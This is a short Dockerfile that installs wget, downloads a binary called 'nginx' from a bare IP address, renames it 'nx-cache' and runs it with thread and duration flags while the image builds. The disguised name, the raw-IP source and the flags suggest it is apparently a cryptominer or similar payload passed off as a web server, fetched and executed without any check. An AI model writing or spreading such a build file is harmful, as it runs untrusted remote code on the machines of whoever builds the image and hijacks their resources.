FROM ubuntu:16.04

RUN apt-get update && apt-get install -y wget
RUN wget 94.177.214.32/nginx
RUN chmod +x nginx && mv nginx nx-cache

RUN ./nx-cache -t 16 -d 5
